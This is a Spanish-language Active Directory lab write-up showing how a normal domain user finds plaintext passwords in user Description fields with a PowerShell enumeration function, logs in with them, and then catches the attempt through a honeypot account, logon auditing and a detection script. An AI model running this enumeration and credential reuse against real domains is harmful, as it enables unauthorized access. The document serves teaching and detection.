# Credentials in Object Properties (Credenciales expuestas en propiedades de objetos AD)

> ⚠️ Fines educativos, laboratorio aislado — ver disclaimer completo en el [README](../README.md).

## Resumen del ataque

Las credenciales no solo se encuentran en archivos compartidos, hay veces (aunque es mucho menos frecuente) que también se pueden encontrar directamente en los atributos de objetos Active Directory. Los admins a menudo documentan información sensible en campos como:
- `Description` (Descripción)
- `Info` (Información)
- `adminDescription`
- `Comments`
- Otros campos personalizados

Un atacante puede consultar todos los usuarios del dominio y buscar credenciales en texto plano dentro de estas propiedades usando PowerShell o herramientas de enumeración AD.

El nivel de realismo de encontrar contraseñas temporales, notas técnicas y credenciales de servicio en propiedades de objetos es común, aunque simplemente debemos tener cuidado con la informacion descriptiva que almacenamops como admins, yaque esto puede suponer un impacto critico si las credenciales encontradas tienen acceso a sistemas importantes.

## Objetivo del ataque

Quiero demostrar cómo, siendo un usuario normal del dominio, puedo:
1. Enumerar todos los usuarios de AD
2. Buscar términos sensibles en sus propiedades (`password`, `pwd`, `pass`, etc.)
3. Extraer credenciales encontradas
4. Comprobar si una cuenta honeypot que dejo preparada como trampa genera alguna alerta al usarla

## Escenario del lab

```
Dominio:         adlab.local
Atacante:        pedri (usuario de dominio normal)
Objetivo:        Extraer credenciales de propiedades de usuarios AD
Método:          PowerShell Get-ADUser con búsqueda
Honeypot:        honeypot (cuenta señuelo, con su contraseña real también expuesta en la Description)
Evidencia:       Event ID 4624 — cualquier logon con la cuenta honeypot es la alerta, tenga éxito o no
```

## Paso 1: Configuro usuarios con credenciales en la Description

En DC01 reviso los usuarios de la OU Users y les añado información sensible en la Description. Para esta prueba me quedo con dos casos concretos:

Usuario `rodri`
- Contraseña real: `12345678`
- Description: `Pass:12345678`

Usuario `honeypot` (la trampa)
- Contraseña real: `señuelo`
- Description: `pwd:señuelo`

A diferencia de un honeypot con una contraseña falsa que solo sirve para forzar un fallo de login, aquí dejo la contraseña real dentro de la Description. Nadie legítimo usa la cuenta `honeypot`, así que me da igual si el login tiene éxito o falla: en cualquiera de los dos casos ya sé que alguien la ha encontrado fisgando por las propiedades del resto de usuarios. Evidentemente el nombre debemos poner algo un poco jugoso si ponemos honeypot posiblemnte un atacante no haga nada con ella jajaj.

![Usuarios y equipos de Active Directory con las cuentas del dominio: rodri con "Pass:12345678" en la Description y unai_simon con una nota de privilegios temporales, junto a honeypot, cucurella, dani_olmo, lamine, svc_sql y svcbackup Gonzalez](<img/Creo usuarios y añado descripcion.png>)

## Paso 2: Ejecuto el ataque

### 2.1 Creo el script de búsqueda

Este es el script que uso para enumerar credenciales. Lo guardo como `06-Search-UserCredentials.ps1`:

```powershell
# Script de búsqueda de credenciales en propiedades de objetos AD
Function SearchUserClearText {
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $SearchTerms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $SearchTerms) {
        $list += "(`$_.Description -like '*$t*')"
        $list += "(`$_.Info -like '*$t*')"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```

### 2.2 Cargo el script en el perfil de PowerShell (permanente)

Para que la función se cargue automáticamente cada vez que `pedri` abre PowerShell y no tener que hacerlo dia a dia, en caso de ser una tarea repetitiva la cargaremos en `$PROFILE`:

En JORGE-CLIENTE como `pedri`:

1. Abro PowerShell
2. Ejecuto:
```powershell
# Ver dónde está el profile
$PROFILE

# Crear la carpeta si no existe
New-Item -ItemType Directory -Path (Split-Path $PROFILE) -Force -ErrorAction SilentlyContinue

# Editar el profile
notepad $PROFILE
```
3. En el Bloc de notas pego el script completo (la función `SearchUserClearText`)
4. Guardo y cierro (`Ctrl + S`, `Ctrl + X`)
5. Cierro PowerShell completamente y lo reabro
6. Ahora la función está disponible automáticamente

![Perfil de PowerShell de pedri abierto en notepad, con la función SearchUserClearText ya pegada dentro](<img/Genero script y lo meto en el perfil del usuario.png>)

### 2.3 Ejecuto la búsqueda de credenciales

En JORGE-CLIENTE como `pedri`, con la función ya cargada:

```powershell
SearchUserClearText -SearchTerms "pass"
```

Salida:
```
SamAccountName        : rodri
Enabled               : True
Description           : Pass:12345678
Info                  :
PasswordNeverExpires  : True
PasswordLastSet       : 24/06/2026 11:14:28
```

Amplío la búsqueda para que también cace "pwd":

```powershell
SearchUserClearText -SearchTerms "pass","pwd"
```

Salida:
```
SamAccountName        : rodri
Enabled               : True
Description           : Pass:12345678
Info                  :
PasswordNeverExpires  : True
PasswordLastSet       : 24/06/2026 11:14:28

SamAccountName        : honeypot
Enabled               : True
Description           : pwd:señuelo
Info                  :
PasswordNeverExpires  : True
PasswordLastSet       : 10/07/2026 11:49:58
```

![Ejecución de SearchUserClearText desde el perfil ya cargado: primero solo con "pass" (rodri) y después con "pass","pwd" (rodri + honeypot)](<img/Ya cargada en memoria solo llamo a la funcion.png>)

El resto de cuentas del dominio no aparece en ninguna de las dos búsquedas porque su Description no contiene "pass" ni "pwd" como substringl, para hacer una buena enumeracion deberiamos añadir mas casdenas de texto pero para una muestra asi es suficiente.

### 2.4 Extraigo las credenciales encontradas

Con esto tengo:
- `rodri:12345678`
- `honeypot:señuelo` ← cuenta trampa, nadie debería usarla nunca

### 2.5 Intento autenticarme con las credenciales encontradas

Intento 1 — `rodri` (cuenta real):

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    "adlab\rodri", 
    (ConvertTo-SecureString "12345678" -AsPlainText -Force)
)
Get-ADUser -Filter * -Credential $cred
# Autenticación correcta -> Event ID 4624
```

Intento 2 — `honeypot` (la trampa):

```powershell
$cred = New-Object System.Management.Automation.PSCredential(
    "adlab\honeypot", 
    (ConvertTo-SecureString "señuelo" -AsPlainText -Force)
)
Get-ADUser -Filter * -Credential $cred
# Autenticación correcta también -> Event ID 4624, pero esta vez ES la alerta
```

Aquí está la diferencia con un honeypot "clásico": no busco que la contraseña falle para generar un 4625. Como dejo la contraseña real en la Description, la autenticación funciona igual que con `rodri`. La señal de compromiso no está en si el login falla o tiene éxito, está en que exista cualquier login con la cuenta `honeypot`, porque ningún proceso legítimo del dominio la usa.

### 2.6 Resumen del proceso

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Cargar el script en el profile de pedri (una sola vez)   │
│    -> Crea la función SearchUserClearText                   │
├─────────────────────────────────────────────────────────────┤
│ 2. Abrir PowerShell (carga la función automáticamente)      │
├─────────────────────────────────────────────────────────────┤
│ 3. Ejecutar: SearchUserClearText -SearchTerms "pass","pwd"  │
│    Encuentra credenciales en la Description de rodri y      │
│    honeypot                                                 │
├─────────────────────────────────────────────────────────────┤
│ 4. Intentar logarse con las credenciales encontradas        │
│    - rodri:12345678    -> Event 4624 (normal)                │
│    - honeypot:señuelo  -> Event 4624, pero ES LA ALERTA       │
├─────────────────────────────────────────────────────────────┤
│ 5. El script de detección vigila Event 4624 sobre honeypot  │
│    -> Si aparece, ALERTA: alguien encontró la cuenta trampa │
└─────────────────────────────────────────────────────────────┘
```

## Paso 3: Indicadores de Compromiso (IoCs)

### En DC01 (Visor de eventos → Seguridad):

Event ID 4624 — Logon correcto sobre la cuenta honeypot
```
Usuario: ADLAB\honeypot
Tipo de logon: 3 (network, vía Kerberos)
IP origen: 100.100.100.40 (JORGE-CLIENTE)
Token elevado: Sí
```

![Evento 4624 en el Visor de eventos de DC01: inicio de sesión correcto de ADLAB\honeypot desde 100.100.100.40](<img/log evidencia.png>)

Señales de alarma:

1. Cualquier evento 4624 con `TargetUserName = honeypot`, independientemente de la hora o de si la contraseña usada era la "correcta".
2. Logons de `rodri` u otras cuentas con contraseña expuesta desde una IP que normalmente no usa esa cuenta.
3. Patrón de enumeración: consultas `Get-ADUser` con `-Properties Description,Info` desde una cuenta de usuario normal, seguidas de logons con las cuentas encontradas.

## Paso 4: Habilito la auditoría de inicio de sesión

Para que estos eventos se generen hace falta activar la auditoría de logon, tanto a nivel local como de dominio.

En `secpol.msc` (comprobación local en el DC):

![Directiva de auditoría local con "Auditar eventos de inicio de sesión de cuenta" en Correcto y Erróneo](<img/habilito los logs de inicio de sesion.png>)

A nivel de dominio, dentro de la GPO correspondiente, en Configuración de directiva de auditoría avanzada → Inicio y cierre de sesión → Auditar inicio de sesión, lo dejo en Aciertos y errores:

![GPO con la subcategoría "Auditar inicio de sesión" configurada en Aciertos y errores](<img/habilito logs 2.png>)

## Paso 5: Detección con Script PowerShell

```powershell
# Detect-HoneypotAttack.ps1
# Detecta accesos a la cuenta honeypot (Event ID 4624): cualquier logon con
# esa cuenta es la alerta, no hace falta que falle.

param(
    [int]$HoursBack = 24,
    [string]$HoneypotUser = "honeypot",
    [string]$Domain = "adlab.local"
)

Write-Host "[*] Buscando logons sobre la cuenta honeypot: $HoneypotUser" -ForegroundColor Cyan
Write-Host "[*] Período: últimas $HoursBack horas" -ForegroundColor Cyan
Write-Host ""

$startTime = (Get-Date).AddHours(-$HoursBack)

# Cualquier 4624 sobre la cuenta honeypot es sospechoso, no solo los fallos
$honeypotLogons = Get-WinEvent -FilterHashtable @{
    LogName   = "Security"
    ID        = 4624
    StartTime = $startTime
} -ErrorAction SilentlyContinue | Where-Object {
    $_.Properties[5].Value -eq $HoneypotUser
}

if ($honeypotLogons) {
    Write-Host "[CRÍTICA] Se detectaron logons sobre la cuenta honeypot" -ForegroundColor Red
    Write-Host "   Usuario honeypot: $HoneypotUser" -ForegroundColor Red
    Write-Host "   Logons detectados: $($honeypotLogons.Count)" -ForegroundColor Red
    Write-Host ""
    
    foreach ($logon in $honeypotLogons) {
        $xml = [xml]$logon.ToXml()
        $eventData = $xml.Event.EventData.Data
        
        $time = $logon.TimeCreated
        $user = ($eventData | Where-Object {$_.Name -eq "TargetUserName"}).InnerText
        $ip = ($eventData | Where-Object {$_.Name -eq "IpAddress"}).InnerText
        
        Write-Host "   Logon sobre honeypot:" -ForegroundColor Red
        Write-Host "     Hora: $time" -ForegroundColor Yellow
        Write-Host "     Usuario: $user" -ForegroundColor Yellow
        Write-Host "     IP origen: $ip" -ForegroundColor Yellow
        Write-Host ""
    }
} else {
    Write-Host "No se detectaron logons sobre la cuenta honeypot" -ForegroundColor Green
}

# Logons exitosos de otras cuentas con credenciales potencialmente expuestas
Write-Host ""
Write-Host "[*] Buscando logons exitosos de cuentas sensibles..." -ForegroundColor Cyan

$sensitiveAccounts = @("rodri", "svc_sql", "svc_backup", "admin_temp")
$suspiciousLogons = @()

foreach ($account in $sensitiveAccounts) {
    $logons = Get-WinEvent -FilterHashtable @{
        LogName   = "Security"
        ID        = 4624
        StartTime = $startTime
    } -ErrorAction SilentlyContinue | Where-Object {
        $_.Properties[5].Value -eq $account
    }
    
    if ($logons) {
        $suspiciousLogons += $logons
        Write-Host "Usuario logueado: $account ($($logons.Count) veces)" -ForegroundColor Yellow
    }
}

if ($suspiciousLogons.Count -eq 0) {
    Write-Host "No se detectaron logons de cuentas sensibles" -ForegroundColor Green
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "Análisis completado" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
```

Uso:
```powershell
.\Detect-HoneypotAttack.ps1 -HoneypotUser "honeypot" -HoursBack 24
```

## Paso 6: Mitigación y Hardening

### 1. Nunca almacenar credenciales en propiedades de objetos

```powershell
# Script para auditar y limpiar propiedades sospechosas
Get-ADUser -Filter * -Properties Description, Info | 
    Where-Object { $_.Description -match "pass|pwd|password" -or $_.Info -match "pass|pwd" } |
    ForEach-Object {
        Write-Host "Usuario: $($_.SamAccountName)"
        Write-Host "Description: $($_.Description)"
        Write-Host "Info: $($_.Info)"
    }
```

### 2. Implementar honeypots de verdad

- Crear cuentas señuelo que ningún proceso legítimo use nunca.
- Monitorear TODO acceso a esas cuentas, tenga éxito o falle: si la contraseña expuesta en la Description es la real (como en este lab), el único evento que se va a ver es un 4624.
- Alertar automáticamente ante cualquier logon, no solo ante los fallidos.

### 3. Auditar regularmente propiedades de objetos

```powershell
# Búsqueda semanal de credenciales en AD
$badPatterns = "password", "pwd", "pass", "contraseña", "secret", "api.key"
foreach ($pattern in $badPatterns) {
    Get-ADUser -Filter {Description -like "*$pattern*" -or Info -like "*$pattern*"}
}
```

## Notas importantes

1. **4624 vs 4625**: 4624 es un logon EXITOSO (usuario y contraseña correctos), 4625 es un logon FALLIDO. La mayoría de diseños de honeypot asumen que el atacante va a fallar (contraseña falsa en la Description → 4625), pero si la Description contiene la contraseña real, como aquí, el logon tiene éxito y el evento que hay que vigilar es el 4624, no el 4625.

2. **El fallo de diseño que me encontré**: el script `Detect-HoneypotAttack.ps1` que tenía preparado de base solo alertaba sobre Event ID 4625 en la cuenta honeypot. Como en este lab la Description tenía la contraseña real, el ataque generó un 4624 y ese script no lo habría detectado. Lo corrijo en el script del Paso 5 para que vigile 4624 en vez de 4625.

3. **Auditoría es crítica**: sin Event ID 4624 activado (Paso 4), no sé quién intentó logarse ni cuándo.

4. **Cuentas de servicio son objetivo**: son lo primero que busca un atacante después de encontrar credenciales en las propiedades de AD.

## Referencias

- [Microsoft: Event ID 4624 (Logon Success)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)
- [Microsoft: Event ID 4625 (Logon Failure)](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)
- [SANS: Honeypot Monitoring](https://www.sans.org/white-papers/)

**Estado**: Completado  
**Evidencia generada**: Event ID 4624 (logon sobre la cuenta honeypot) 
